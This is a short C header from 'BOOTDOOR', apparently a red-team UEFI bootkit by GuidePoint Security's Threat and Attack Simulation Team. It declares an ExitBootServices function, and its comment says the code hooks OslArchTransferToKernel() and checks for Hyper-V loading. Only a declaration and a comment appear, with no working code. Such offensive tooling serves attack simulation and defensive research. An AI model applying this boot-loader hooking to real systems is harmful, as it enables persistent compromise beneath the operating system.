/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Installs a hook on OslArchTransferToKernel() and
 * checks if hyper-v is being loaded.
 *
!*/
D_SEC( B ) EFI_STATUS EFIAPI ExitBootServices( EFI_HANDLE ImageHandle, UINTN Key );
